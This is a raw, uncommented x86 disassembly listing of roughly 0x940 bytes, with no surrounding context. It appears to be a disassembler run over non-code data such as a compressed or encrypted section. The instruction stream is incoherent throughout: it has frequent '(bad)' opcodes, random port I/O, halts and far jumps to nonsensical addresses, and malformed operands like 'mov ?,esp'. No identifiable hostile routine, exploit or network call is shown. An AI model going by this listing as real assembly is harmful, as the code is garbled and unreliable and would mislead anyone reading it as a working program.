  40e835:	add    BYTE PTR [eax+0x75877c],dh
	...
  40e853:	lods   eax,DWORD PTR ds:[esi]
  40e854:	and    bl,BYTE PTR [esp+esi*8-0x1a]
  40e858:	push   ebx
  40e859:	jb     0x40e86c
  40e85b:	in     eax,0xa
  40e85d:	jne    0x40e865
  40e85f:	or     eax,0xe9015cb1
  40e864:	add    eax,DWORD PTR [esi-0x15]
  40e867:	outs   dx,BYTE PTR ds:[esi]
  40e868:	lods   al,BYTE PTR ds:[esi]
  40e869:	sar    DWORD PTR [edi+0xc],0x68
  40e86d:	jae    0x40e87b
  40e86f:	inc    eax
  40e870:	out    dx,al
  40e871:	out    0xe8,eax
  40e873:	iret   
  40e874:	mov    al,ds:0xc919fffe
  40e879:	jb     0x40e8bb
  40e87b:	adc    dl,dh
  40e87d:	out    dx,eax
  40e87e:	mov    ecx,DWORD PTR [eax+0x78]
  40e881:	std    
  40e882:	jne    0x40e899
  40e884:	adc    DWORD PTR [ebx-0x5],0xd8886822
  40e88b:	and    dh,dl
  40e88d:	out    0xe8,eax
  40e88f:	cdq    
  40e890:	add    eax,DWORD PTR [eax]
  40e892:	add    al,ah
  40e894:	aad    0xfb
  40e896:	call   0x3e56e8
  40e89b:	xlat   BYTE PTR ds:[ebx]
  40e89c:	ret    
  40e89d:	jmp    0xc16fad0
  40e8a2:	push   eax
  40e8a3:	repnz cmc 
  40e8a5:	(bad)  
  40e8a6:	adc    bl,BYTE PTR [ebp+0x69c08504]
  40e8ac:	retf   0x458b
  40e8af:	in     eax,0x80
  40e8b1:	xchg   esp,eax
  40e8b2:	add    ebx,DWORD PTR ds:0xc33b04
	...
  40e8d0:	test   al,0x81
  40e8d2:	jmp    0xe816a988
  40e8d7:	call   0x40ef05
  40e8dc:	mov    al,ds:0xf4e8fbd4
  40e8e1:	int    0xab
  40e8e3:	inc    BYTE PTR [ebx]
  40e8e5:	cld    
  40e8e6:	ret    
  40e8e7:	pop    esi
  40e8e8:	call   0x4fad:0xfcc1bce2
  40e8ef:	mov    ebx,eax
  40e8f1:	cld    
  40e8f2:	push   esp
  40e8f3:	push   ebx
  40e8f4:	dec    edx
  40e8f5:	idiv   DWORD PTR [eax+0x44]
  40e8f8:	(bad)  
  40e8fa:	sbb    edx,DWORD PTR [edi-0x17fd520c]
  40e900:	sbb    bh,BYTE PTR [edx-0x5b]
  40e903:	(bad)  
  40e904:	outs   dx,DWORD PTR ds:[esi]
  40e905:	jge    0x40e8c3
  40e907:	inc    esp
  40e908:	mov    ebx,0x28f57fad
  40e90d:	bound  edi,QWORD PTR [ecx+0x4c]
  40e910:	lods   al,BYTE PTR ds:[esi]
  40e911:	add    ecx,DWORD PTR [ebx+esi*1]
  40e914:	(bad)  
  40e915:	and    al,ah
  40e917:	pop    esi
  40e918:	mov    ds:0x9d1803e,eax
  40e91d:	adc    bh,BYTE PTR [ecx+0x1b]
  40e920:	lds    esp,FWORD PTR [edx]
  40e922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e923:	cmp    al,BYTE PTR [edi-0x1f961e46]
  40e929:	inc    esi
  40e92a:	xor    BYTE PTR [eax],cl
  40e92c:	and    DWORD PTR [esi-0x2],0x4ac06b4f
  40e933:	push   ss
	...
  40e94c:	add    BYTE PTR [ebp+ebp*4+0x30e8c381],dh
  40e953:	ret    
  40e954:	jae    0x40e953
  40e956:	sub    bh,BYTE PTR [esi+0x30f30f17]
  40e95c:	jecxz  0x40e9ad
  40e95e:	test   eax,0xac3b44bc
  40e963:	dec    esp
  40e964:	call   0x44bd85
  40e969:	jle    0x40e9db
  40e96b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e96c:	pop    esi
  40e96d:	ret    0xbb72
  40e970:	shl    eax,0x4
  40e973:	jmp    0x69f168c6
  40e978:	daa    
  40e979:	cld    
  40e97a:	add    al,0x3a
  40e97c:	dec    esi
  40e97d:	mov    cl,bl
  40e97f:	imul   esp,DWORD PTR [edi],0xd53f04e8
  40e985:	repnz sbb ch,ch
  40e988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e989:	pusha  
  40e98a:	or     eax,0x4adf4c1
  40e98f:	jmp    0x9ec9b50c
  40e994:	das    
  40e995:	clc    
  40e996:	shr    BYTE PTR [eax+0x2b8a1399],cl
  40e99c:	clc    
  40e99d:	sub    DWORD PTR ds:0x4f40471,ebp
  40e9a3:	xchg   ecx,eax
  40e9a4:	sbb    ch,BYTE PTR [esi+0x7e4e7d9e]
  40e9aa:	mov    ebp,0x4ac6280
  40e9af:	jmp    0x40ea2d
	...
  40e9c8:	add    BYTE PTR [eax],al
  40e9ca:	mov    dh,0xaa
  40e9cc:	neg    BYTE PTR [ecx]
  40e9ce:	hlt    
  40e9cf:	sub    al,0x81
  40e9d1:	add    al,0xf4
  40e9d3:	add    al,0x1a
  40e9d5:	les    ebx,FWORD PTR [ebx+0x7aa55335]
  40e9db:	aas    
  40e9dc:	mov    ds:0xe90d3646,al
  40e9e1:	dec    esi
  40e9e2:	jg     0x40e995
  40e9e4:	xchg   edi,eax
  40e9e5:	push   edx
  40e9e6:	retf   0xa38f
  40e9e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9ea:	stos   DWORD PTR es:[edi],eax
  40e9eb:	sub    al,0x80
  40e9ed:	add    al,0xf4
  40e9ef:	add    al,0x11
  40e9f1:	xor    al,0x4f
  40e9f3:	sahf   
  40e9f4:	adc    eax,0x1f883b79
  40e9f9:	xor    al,bl
  40e9fb:	mov    DWORD PTR [ebx-0x460a6259],ebp
  40ea01:	ror    ecx,1
  40ea03:	xchg   ebp,eax
  40ea04:	(bad)  
  40ea05:	(bad)  
  40ea06:	mov    ds:0xedf74b3,al
  40ea0b:	sbb    esp,edi
  40ea0d:	pop    ebx
  40ea0e:	jnp    0x3cfdb68
  40ea14:	mov    ebp,DWORD PTR [eax-0x3eaef9a4]
  40ea1a:	ror    ebx,0x0
  40ea1d:	jmp    0xb09e4806
  40ea22:	mov    ch,0x1
  40ea24:	add    BYTE PTR [eax],bl
  40ea26:	jne    0x40ea41
  40ea28:	and    al,0xe1
  40ea2a:	div    DWORD PTR [ecx]
  40ea2c:	push   esi
  40ea2d:	add    BYTE PTR ds:[eax],al
	...
  40ea44:	add    BYTE PTR [eax],al
  40ea46:	add    BYTE PTR [edi+edx*8],al
  40ea49:	test   BYTE PTR [ecx-0x56952ce5],ch
  40ea4f:	lock mov edi,esi
  40ea52:	ss xchg ecx,eax
  40ea54:	adc    DWORD PTR [ecx+eiz*8],esp
  40ea57:	(bad)  
  40ea58:	jbe    0x40ea22
  40ea5a:	call   0x6d307456
  40ea5f:	push   ecx
  40ea60:	sbb    BYTE PTR [ebx+edi*4],al
  40ea63:	mov    bh,0xaa
  40ea65:	es mov edi,0xe8ff7bef
  40ea6b:	test   DWORD PTR [ecx-0x635abe3a],0x8b294efe
  40ea75:	xlat   BYTE PTR ds:[ebx]
  40ea76:	push   ecx
  40ea77:	ins    DWORD PTR es:[edi],dx
  40ea78:	int3   
  40ea79:	add    cl,ch
  40ea7b:	in     eax,dx
  40ea7c:	ret    0xe7ea
  40ea7f:	std    
  40ea80:	add    al,0x68
  40ea82:	push   eax
  40ea83:	test   DWORD PTR [eax+eax*1],0xb7a537da
  40ea8a:	and    BYTE PTR [eax-0x5348a162],dl
  40ea90:	cmp    eax,edx
  40ea92:	in     eax,0xf7
  40ea94:	aaa    
  40ea95:	mov    eax,DWORD PTR [eax]
  40ea97:	or     DWORD PTR [ebx],esi
  40ea99:	push   esi
  40ea9a:	push   edi
  40ea9b:	cwde   
  40ea9c:	fdivp  st(3),st
  40ea9e:	push   eax
  40ea9f:	jne    0x40ea2c
  40eaa1:	(bad)  
  40eaa2:	dec    DWORD PTR ds:0x1afad579
  40eaa8:	popa   
  40eaa9:	mov    eax,esi
	...
  40eac3:	add    BYTE PTR [eax-0x69df8d86],dl
  40eac9:	dec    ebx
  40eaca:	cld    
  40eacb:	mov    ecx,0x746
  40ead0:	out    dx,al
  40ead1:	push   edx
  40ead2:	mov    ecx,edi
  40ead4:	mov    ds:0x20d28380,al
  40ead9:	idiv   DWORD PTR [eax]
  40eadb:	dec    ebp
  40eadc:	mov    ebx,esi
  40eade:	or     BYTE PTR [ebx+0x1890908],cl
  40eae4:	inc    esi
  40eae5:	iret   
  40eae6:	jmp    0xafa9edf3
  40eaeb:	enter  0x8cc,0x33
  40eaef:	rcr    dl,0x46
  40eaf2:	leave  
  40eaf3:	ret    0x891
  40eaf6:	push   ecx
  40eaf7:	sub    DWORD PTR [ecx-0x1fff95c],0xffffffde
  40eafe:	push   esi
  40eaff:	je     0x40ead5
  40eb01:	lea    edi,[esi-0x40161f8c]
  40eb07:	fisttp DWORD PTR [eax+ecx*1-0x1fda7500]
  40eb0e:	(bad)  
  40eb0f:	je     0x40eb12
  40eb11:	cdq    
  40eb12:	out    0xf6,al
  40eb14:	and    eax,0x1d8b0002
  40eb19:	mov    ?,esp
  40eb1b:	jne    0x40eb6e
  40eb1d:	mov    dl,0xbe
  40eb1f:	jmp    0x40eb63
  40eb21:	fisub  WORD PTR [edi-0x66]
  40eb24:	pop    ebp
  40eb25:	or     BYTE PTR [eax],al
  40eb27:	mov    eax,DWORD PTR [eax]
	...
  40eb41:	hlt    
  40eb42:	jmp    0x55a3:0xb3d30ab
  40eb49:	jle    0x40eb31
  40eb4b:	stos   DWORD PTR es:[edi],eax
  40eb4c:	push   0x8a02ad3c
  40eb51:	aaa    
  40eb52:	pop    es
  40eb53:	adc    ch,BYTE PTR [edx-0xc]
  40eb56:	test   DWORD PTR [edi+edi*8+0x13],edi
  40eb5a:	scas   al,BYTE PTR es:[edi]
  40eb5b:	aad    0xbf
  40eb5d:	sbb    al,0x93
  40eb5f:	fwait
  40eb60:	inc    BYTE PTR [ebx]
  40eb62:	rol    DWORD PTR [ecx+0x5b],cl
  40eb65:	popf   
  40eb66:	outs   dx,DWORD PTR ds:[esi]
  40eb67:	push   es
  40eb68:	add    BYTE PTR [ecx+0x17],cl
  40eb6b:	scas   eax,DWORD PTR es:[edi]
  40eb6c:	push   eax
  40eb6d:	inc    ebp
  40eb6e:	hlt    
  40eb6f:	nop
  40eb70:	inc    esp
  40eb71:	loopne 0x40eb70
  40eb73:	sub    edx,DWORD PTR [esi-0x17fd520c]
  40eb79:	or     ch,BYTE PTR [eax-0x5f]
  40eb7c:	(bad)  
  40eb7d:	jg     0x40ebd4
  40eb7f:	xchg   eax,ecx
  40eb81:	dec    eax
  40eb82:	xchg   edx,eax
  40eb83:	lea    eax,[eax+edi*4+0x7]
  40eb87:	fdiv   QWORD PTR [edx]
  40eb89:	(bad)  
  40eb8a:	jecxz  0x40eb26
  40eb8c:	cmc    
  40eb8d:	jno    0x40ec0e
  40eb8f:	pop    ss
  40eb90:	push   cs
  40eb91:	fstp   QWORD PTR [eax+0x26ed719e]
  40eb97:	cmp    BYTE PTR [eax],cl
  40eb99:	jge    0x40eb4a
  40eb9b:	(bad)  
  40eb9c:	rcr    BYTE PTR [edi-0x1717cc6b],0xe5
  40eba3:	add    eax,DWORD PTR [eax]
	...
  40ebbd:	add    bh,al
  40ebbf:	in     eax,dx
  40ebc0:	inc    eax
  40ebc1:	leave  
  40ebc2:	ss test eax,0x497f5502
  40ebc8:	xor    al,0x51
  40ebca:	retf   0x4820
  40ebcd:	cld    
  40ebce:	(bad)  
  40ebcf:	(bad)  
  40ebd0:	es call 0xa260f020
  40ebd6:	dec    edx
  40ebd7:	(bad)  
  40ebd8:	xor    BYTE PTR [eax-0x710aefd4],cl
  40ebde:	mov    al,0x98
  40ebe0:	sbb    ch,0xe6
  40ebe3:	mov    dh,0xa6
  40ebe5:	call   0xddf2:0x181a8121
  40ebec:	jnp    0x40eb8d
  40ebee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebef:	or     eax,0x8dfc3862
  40ebf4:	jmp    0xc32:0xf0af348c
  40ebfb:	mov    al,0xad
  40ebfd:	add    esi,esp
  40ebff:	xlat   BYTE PTR ds:[ebx]
  40ec00:	test   al,0x42
  40ec02:	mov    ebp,0x4103ecc7
  40ec07:	mov    cs,esp
  40ec09:	test   edi,edx
  40ec0b:	popf   
  40ec0c:	pop    ss
  40ec0d:	test   DWORD PTR [eax+0xd],ebx
  40ec10:	jmp    0x1d731649
  40ec15:	(bad)  
  40ec16:	jo     0x40ebdd
  40ec18:	adc    al,0xf2
  40ec1a:	dec    esi
  40ec1b:	(bad)
  40ec1e:	ret    
  40ec1f:	xor    cl,BYTE PTR [esi+0x17]
	...
  40ec39:	add    BYTE PTR [eax],al
  40ec3b:	cld    
  40ec3c:	lods   al,BYTE PTR ds:[esi]
  40ec3d:	(bad)  
  40ec3f:	hlt    
  40ec40:	add    al,0x72
  40ec42:	xchg   esp,eax
  40ec43:	js     0x40ebd8
  40ec45:	sti    
  40ec46:	pop    es
  40ec47:	out    0xc4,al
  40ec49:	and    ebx,0x8ccd2f29
  40ec4f:	mov    dl,0xad
  40ec51:	mov    ch,0x9b
  40ec53:	sbb    BYTE PTR [edx-0x525c7242],0x5d
  40ec5a:	leave  
  40ec5b:	hlt    
  40ec5c:	add    al,0x73
  40ec5e:	lds    ebx,FWORD PTR [esi+0xe]
  40ec61:	rol    DWORD PTR [ebx],cl
  40ec63:	into   
  40ec64:	and    BYTE PTR [eax],al
  40ec66:	cli    
  40ec67:	aaa    
  40ec68:	mov    ds:0x9b95313f,al
  40ec6d:	pop    esi
  40ec6e:	(bad)  
  40ec6f:	or     BYTE PTR [esi+0x639bce4],cl
  40ec75:	add    BYTE PTR [edx-0x10c840e0],bh
  40ec7b:	or     cl,BYTE PTR ds:0xacff7fff
  40ec81:	test   DWORD PTR es:[si],0x386ed788
  40ec89:	add    al,0x60
  40ec8b:	mov    dh,0xc
  40ec8d:	mov    DWORD PTR [edi-0x1c],eax
  40ec90:	cmp    eax,0x2ce453c3
  40ec95:	mov    al,0x5c
  40ec97:	mov    cl,0x4
  40ec99:	call   0x453e57
  40ec9e:	cli    
	...
  40ecb7:	add    BYTE PTR [ecx-0x3eca3622],ah
  40ecbd:	xchg   BYTE PTR [ecx+eiz*8-0xf],bh
  40ecc1:	sbb    dh,BYTE PTR ds:0x32990a60
  40ecc7:	test   eax,0xe2e4407e
  40eccc:	cmp    cl,BYTE PTR ds:0xf59fcd7d
  40ecd2:	pop    es
  40ecd3:	adc    al,0xab
  40ecd5:	rcl    DWORD PTR [ebx-0xf],1
  40ecd8:	test   BYTE PTR [edi],0xf
  40ecdb:	push   0xffffffb7
  40ecdd:	add    edi,DWORD PTR [ebx]
  40ecdf:	sub    al,0xe8
  40ece1:	or     DWORD PTR [ecx+ebp*4+0x66fc4878],edx
  40ece8:	pop    eax
  40ece9:	or     DWORD PTR [eax+0x52],eax
  40ecec:	inc    eax
  40eced:	(bad)  
  40ecee:	mov    edi,0x648eb0a9
  40ecf3:	inc    ecx
  40ecf4:	js     0x40ed3e
  40ecf6:	cld    
  40ecf7:	add    BYTE PTR [edx+0xee8beaf],dh
  40ecfd:	cmp    BYTE PTR [ecx],al
  40ecff:	add    BYTE PTR [edi],cl
  40ed01:	add    al,BYTE PTR [eax]
  40ed03:	xor    ebp,edi
  40ed05:	mov    esi,0xf1592452
  40ed0a:	and    cl,BYTE PTR [ebx-0x3dc4f274]
  40ed10:	pop    ecx
  40ed11:	cdq    
  40ed12:	xor    ecx,ecx
  40ed14:	inc    ebp
  40ed15:	xchg   ebp,eax
  40ed16:	jae    0x40ed24
  40ed18:	xor    eax,0x7400d5
	...
  40ed35:	daa    
  40ed36:	inc    esi
  40ed37:	cmp    ecx,DWORD PTR [ecx+ebp*1+0x1]
  40ed3b:	je     0x40ed44
  40ed3d:	pop    ebp
  40ed3e:	push   0x6d5d33eb
  40ed43:	add    al,0x40
  40ed45:	es add eax,0xc315418b
  40ed4b:	add    al,BYTE PTR [eax]
  40ed4d:	push   esi
  40ed4e:	dec    ecx
  40ed4f:	or     al,0x85
  40ed51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed52:	inc    BYTE PTR [edi]
  40ed54:	mov    esp,DWORD PTR ds:0xd1488909
  40ed5a:	imul   ebp,DWORD PTR [ecx],0xffffff8b
  40ed5d:	in     eax,dx
  40ed5e:	or     BYTE PTR [ebx],bh
  40ed60:	retf   0xa0ef
  40ed63:	push   esp
  40ed64:	mov    ebx,ebp
  40ed66:	or     al,0x3
  40ed68:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed6a:	retf   0x735c
  40ed6d:	test   al,0x8e
  40ed6f:	cmovno esp,DWORD PTR [ecx+ecx*2]
  40ed73:	or     al,0x84
  40ed75:	jg     0x40ed75
  40ed77:	cmc    
  40ed78:	cmp    BYTE PTR [ebp+edi*8+0x4914410a],bh
  40ed7f:	or     al,0x33
  40ed81:	ffree  st(3)
  40ed83:	and    DWORD PTR [eax-0x6f],0xf4408b04
  40ed8a:	mov    eax,ds:0xae337fc1
  40ed8f:	push   ss
  40ed90:	pop    es
  40ed91:	es out dx,al
  40ed93:	lods   al,BYTE PTR ds:[esi]
  40ed94:	mov    dh,ah
  40ed96:	lods   eax,DWORD PTR ds:[esi]
  40ed97:	add    dl,BYTE PTR [ebx+0x0]
	...
  40edb2:	pop    ebx
  40edb3:	pop    edx
  40edb4:	out    0x7,al
  40edb6:	push   ebx
  40edb7:	mov    cl,0xc6
  40edb9:	adc    DWORD PTR [ebp+ebp*4+0x4379d789],esi
  40edc0:	pop    ds
  40edc1:	add    al,0x6
  40edc3:	out    dx,al
  40edc4:	stos   BYTE PTR es:[edi],al
  40edc5:	je     0x40ed91
  40edc7:	cmp    BYTE PTR [edi],dl
  40edc9:	or     BYTE PTR [edi-0x40],dh
  40edcc:	add    dh,BYTE PTR [ebp-0x29]
  40edcf:	sub    BYTE PTR [ebx+0x2],al
  40edd2:	les    eax,FWORD PTR ds:0xadf5c642
  40edd8:	mov    eax,DWORD PTR ds:0x24166e71
  40edde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eddf:	mov    dh,0x16
  40ede1:	and    al,0xe4
  40ede3:	fstp   QWORD PTR [esi+0x42904014]
  40ede9:	add    BYTE PTR [edi+0x69],dh
  40edec:	push   cs
  40eded:	mov    DWORD PTR [ebx-0x5e],eax
  40edf0:	test   eax,0x7e66f2d
  40edf5:	lea    eax,[eax-0x4a]
  40edf8:	add    ebp,eax
  40edfa:	dec    esi
  40edfb:	imul   eax,DWORD PTR [ebx],0x176d7800
  40ee01:	add    al,0x6
  40ee03:	outs   dx,BYTE PTR ds:[esi]
  40ee04:	test   eax,0x9db77f33
  40ee09:	dec    esi
  40ee0a:	lock stos BYTE PTR es:[edi],al
  40ee0c:	dec    ebp
  40ee0d:	add    al,0x47
  40ee0f:	pop    ss
  40ee10:	pop    ss
  40ee11:	and    al,0x4
  40ee13:	std    
  40ee14:	sahf   
  40ee15:	adc    al,0x0
	...
  40ee2f:	inc    eax
  40ee30:	mov    al,0x42
  40ee32:	add    BYTE PTR [edi+0x4],dh
  40ee35:	sub    eax,0xe537f50f
  40ee3a:	mov    dh,BYTE PTR [edx]
  40ee3c:	add    DWORD PTR [edx+0xd],esp
  40ee3f:	cmp    al,BYTE PTR [eax]
  40ee41:	loope  0x40ee46
  40ee43:	imul   edi,DWORD PTR [edi],0xffffffed
  40ee46:	mov    bh,BYTE PTR [edx+0x320d7200]
  40ee4c:	add    cl,ah
  40ee4e:	add    edx,DWORD PTR [ebx+0x3f]
  40ee51:	in     eax,0x53
  40ee53:	hlt    
  40ee54:	ss ret 0xf7c1
  40ee58:	add    al,0xb4
  40ee5a:	mov    cl,BYTE PTR [edi-0x7c]
  40ee5d:	aad    0x3
  40ee5f:	test   al,0x0
  40ee61:	fcmovnb st,st(3)
  40ee63:	push   ds
  40ee64:	and    eax,0xca89e9f
  40ee69:	jb     0x40ee39
  40ee6b:	adc    esp,DWORD PTR [esi+esi*8-0x774ed63]
  40ee72:	mov    eax,DWORD PTR [eax-0x776993f4]
  40ee78:	add    BYTE PTR [ebx],bl
  40ee7a:	les    ecx,FWORD PTR [esi]
  40ee7c:	dec    esp
  40ee7d:	cmp    dh,BYTE PTR [esi]
  40ee7f:	rep lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee82:	repnz sub eax,DWORD PTR ds:0x87f84d72
  40ee89:	and    BYTE PTR [ebx],al
  40ee8b:	imul   eax,DWORD PTR [ecx],0x88bbe8fa
  40ee91:	xor    eax,0xc
	...
  40eeaa:	add    BYTE PTR [eax],al
  40eeac:	test   DWORD PTR [esi],0x10c33438
  40eeb2:	icebp  
  40eeb3:	pushf  
  40eeb4:	loopne 0x40eefe
  40eeb6:	inc    DWORD PTR [ebx-0xc]
  40eeb9:	jmp    0x40eee8
  40eebb:	or     BYTE PTR [edi+0x46],bh
  40eebe:	in     eax,dx
  40eebf:	xor    BYTE PTR [edi-0x637eddf7],0x4
  40eec6:	add    ah,bh
  40eec8:	add    BYTE PTR [esi-0x3ef57ecb],dl
  40eece:	add    cl,ch
  40eed0:	je     0x40eeb2
  40eed2:	call   FWORD PTR [ebp+0x29]
  40eed5:	add    ebx,ebp
  40eed7:	in     al,dx
  40eed8:	lahf   
  40eed9:	mov    ebx,0x54f7e8
  40eedf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eee0:	and    al,bl
  40eee2:	add    ebp,ecx
  40eee4:	and    cl,BYTE PTR [edx-0x75f66715]
  40eeea:	out    dx,eax
  40eeeb:	pop    esp
  40eeec:	mov    bl,0x98
  40eeee:	dec    edi
  40eeef:	mov    edi,0xa4c7030d
  40eef4:	pop    ebx
  40eef5:	add    al,BYTE PTR [ecx]
  40eef7:	jmp    0x395584f3
  40eefc:	and    eax,0x386cffd6
  40ef01:	adc    dh,BYTE PTR [edx]
  40ef03:	jb     0x40eeb8
  40ef05:	cwde   
  40ef06:	test   BYTE PTR [ecx],ch
  40ef08:	in     al,dx
  40ef09:	jmp    0x8c130f40
  40ef0e:	or     ebp,DWORD PTR [edi]
	...
  40ef28:	add    BYTE PTR [ebp-0x40],ch
  40ef2b:	gs and dl,ch
  40ef2e:	adc    BYTE PTR [esi],ah
  40ef30:	out    0x48,al
  40ef32:	inc    BYTE PTR [edx+0x511d8d0]
  40ef38:	push   0x7e
  40ef3a:	cmp    DWORD PTR [ebp-0x19],esi
  40ef3d:	or     eax,0x7f4f5919
  40ef42:	std    
  40ef43:	sub    BYTE PTR [ecx-0x1e7ce10b],0xf7
  40ef4a:	pmulhuw mm2,QWORD PTR [edx+0x31782aef]
  40ef51:	pusha  
  40ef52:	push   ss
  40ef53:	dec    ebx
  40ef54:	call   0x10a2650
  40ef59:	dec    esi
  40ef5a:	into   
  40ef5b:	mov    ch,ah
  40ef5d:	push   cs
  40ef5e:	pop    esi
  40ef5f:	test   BYTE PTR [ecx+0x2ed79],0x9d
  40ef66:	aam    0x55
  40ef68:	push   edi
  40ef69:	ficomp WORD PTR [ebx+0x66]
  40ef6c:	cld    
  40ef6d:	sahf   
  40ef6e:	inc    ecx
  40ef6f:	add    BYTE PTR [ebx-0x2b],dl
  40ef72:	aad    0x23
  40ef74:	pop    ss
  40ef75:	mov    edx,0x8d109a8e
  40ef7a:	add    DWORD PTR [ecx+0x3990f144],ecx
  40ef80:	ret    
  40ef81:	pop    edx
  40ef82:	jge    0x40efc5
  40ef84:	add    DWORD PTR [ebp+0x1],ebx
  40ef87:	mov    esi,DWORD PTR ds:0x3e91bd
	...
  40efa5:	add    BYTE PTR [esi-0x2f],bh
  40efa8:	xor    bh,bh
  40efaa:	or     dl,BYTE PTR [eax+0x39]
  40efad:	ret    
  40efae:	adc    DWORD PTR [ecx-0x625e00b2],0x501a4712
  40efb8:	cmp    ebx,eax
  40efba:	nop
  40efbb:	ins    DWORD PTR es:[edi],dx
  40efbc:	cmp    ebx,edi
  40efbe:	or     BYTE PTR [ebx],0xc6
  40efc1:	inc    esp
  40efc2:	icebp  
  40efc3:	or     DWORD PTR [ecx],eax
  40efc5:	jmp    0x40efd5
  40efca:	aaa    
  40efcb:	test   BYTE PTR [esp+esi*2-0x76a9570f],0x19
  40efd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efd4:	push   ss
  40efd5:	mov    ecx,edi
  40efd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efd8:	adc    ch,al
  40efda:	lods   al,BYTE PTR ds:[esi]
  40efdb:	inc    ebx
  40efdc:	add    DWORD PTR [eax],eax
  40efde:	aaa    
  40efdf:	add    eax,0x84938b53
  40efe4:	xor    ecx,DWORD PTR [eax+0x500048bd]
  40efea:	hlt    
  40efeb:	sub    BYTE PTR [eax+0x24],al
  40efee:	aam    0xcd
  40eff0:	call   0x71d5:0x99bdd873
  40eff7:	pop    esi
  40eff8:	or     al,BYTE PTR [edi+ebp*4+0x7f00029e]
  40efff:	jmp    0x410:0xdebf13df
  40f006:	(bad)  
  40f007:	(bad)  [esi+0x4]
	...
  40f021:	add    BYTE PTR [eax],al
  40f023:	pop    esp
  40f024:	mov    esi,0x24f400be
  40f029:	inc    eax
  40f02a:	and    al,0xfc
  40f02c:	push   es
  40f02d:	(bad)  
  40f02e:	push   cs
  40f02f:	jo     0x40f045
  40f031:	add    al,0x0
  40f033:	hlt    
  40f034:	(bad)  
  40f035:	(bad)  
  40f036:	push   edx
  40f037:	jns    0x40f0a3
  40f039:	fisub  WORD PTR [ebx]
  40f03b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f03c:	sbb    BYTE PTR [eax+0x24],al
  40f03f:	adc    al,0x4e
  40f041:	cdq    
  40f042:	jae    0x40f01c
  40f044:	mov    ebp,0xde71d599
  40f049:	or     al,BYTE PTR [esi+edi*2-0x73fffd62]
  40f050:	xchg   ecx,eax
  40f051:	adc    eax,0xcc1ef440
  40f056:	(bad)  
  40f057:	jns    0x40f073
  40f059:	fistp  QWORD PTR [ebx+0xc]
  40f05c:	push   eax
  40f05d:	ins    DWORD PTR es:[edi],dx
  40f05e:	add    ah,dh
  40f060:	push   ss
  40f061:	ror    DWORD PTR [edi-0xd],0x90
  40f065:	mov    esi,0x879e3413
  40f06a:	inc    ebx
  40f06b:	sbb    dh,dh
  40f06d:	xor    edi,edi
  40f06f:	add    DWORD PTR [esi-0xc],ebx
  40f072:	aas    
  40f073:	hlt    
  40f074:	inc    edi
  40f075:	adc    cl,BYTE PTR [ebp+0x57d80a40]
  40f07b:	int3   
  40f07c:	add    al,0x70
  40f07e:	dec    ebp
  40f07f:	cmc    
  40f080:	add    al,0x6c
  40f082:	jg     0x40f05b
  40f084:	or     al,0xe8
  40f086:	add    eax,DWORD PTR [eax]
	...
  40f0a0:	hlt    
  40f0a1:	pushf  
  40f0a2:	inc    ebx
  40f0a3:	cdq    
  40f0a4:	mov    ds:0x3752f593,al
  40f0a9:	jmp    0x5c44247e
  40f0ae:	sub    al,0xe0
  40f0b0:	fnstenv [esi+ebx*8]
  40f0b3:	push   edx
  40f0b4:	aaa    
  40f0b5:	jmp    0x88aa24d8
  40f0ba:	add    al,0x80
  40f0bc:	jae    0x40f051
  40f0be:	call   0x4c969f6
  40f0c3:	mov    esp,?
  40f0c5:	add    al,0xe9
  40f0c7:	xor    ebp,DWORD PTR [edi-0x36]
  40f0ca:	cwde   
  40f0cb:	sub    eax,0x57643012
  40f0d0:	pop    ss
  40f0d1:	cmc    
  40f0d2:	out    0x3,eax
  40f0d4:	hlt    
  40f0d5:	pushf  
  40f0d6:	loop   0x40f12e
  40f0d8:	hlt    
  40f0d9:	add    al,0x6a
  40f0db:	mov    edi,0x19288a0b
  40f0e0:	aam    0x93
  40f0e2:	xchg   esp,eax
  40f0e3:	fild   WORD PTR [edi]
  40f0e5:	sub    BYTE PTR ds:0xdce8a79a,0x33
  40f0ec:	pushf  
  40f0ed:	nop
  40f0ee:	jns    0x40f133
  40f0f0:	hlt    
  40f0f1:	push   ds
  40f0f2:	jmp    0x40f09f
  40f0f4:	adc    edi,ecx
  40f0f6:	jmp    0xb9ff:0x54c47003
  40f0fd:	dec    ecx
  40f0fe:	or     eax,0xb1d5f509
  40f103:	cdq    
	...
  40f11c:	add    BYTE PTR [edi-0x17],ah
  40f11f:	loopne 0x40f0cc
  40f121:	lods   al,BYTE PTR ds:[esi]
  40f122:	(bad)  
  40f123:	out    0x3,eax
  40f125:	daa    
  40f126:	xchg   edx,eax
  40f127:	(bad)  
  40f128:	cmp    al,0xd4
  40f12a:	idiv   dh
  40f12c:	aam    0x3f
  40f12e:	add    al,BYTE PTR [eax-0x17]
  40f131:	imul   eax,DWORD PTR [esi+0x24],0x5b32ecee
  40f138:	bound  ecx,QWORD PTR [ebx+0x7134c331]
  40f13e:	sahf   
  40f13f:	or     BYTE PTR [ebp+0x7deb8578],0xfa
  40f146:	add    al,0x0
  40f148:	sbb    al,dh
  40f14a:	jge    0x40f1c0
  40f14c:	loope  0x40f112
  40f14e:	xchg   ecx,eax
  40f14f:	je     0x40f14a
  40f151:	pop    esp
  40f152:	sbb    DWORD PTR [edi+esi*4],ecx
  40f155:	mov    ecx,?
  40f157:	xchg   ebx,eax
  40f158:	stc    
  40f159:	mov    bh,0x4
  40f15b:	mov    DWORD PTR [ebp+0x29850243],esp
  40f161:	in     eax,dx
  40f162:	mov    BYTE PTR [eax],dl
  40f164:	call   0xad37f660
  40f169:	inc    edi
  40f16a:	xchg   edx,eax
  40f16b:	(bad)  
  40f16c:	jmp    0xedc5f4b8
  40f171:	test   BYTE PTR [eax+eax*1],0x64
  40f175:	xchg   BYTE PTR [ebx],al
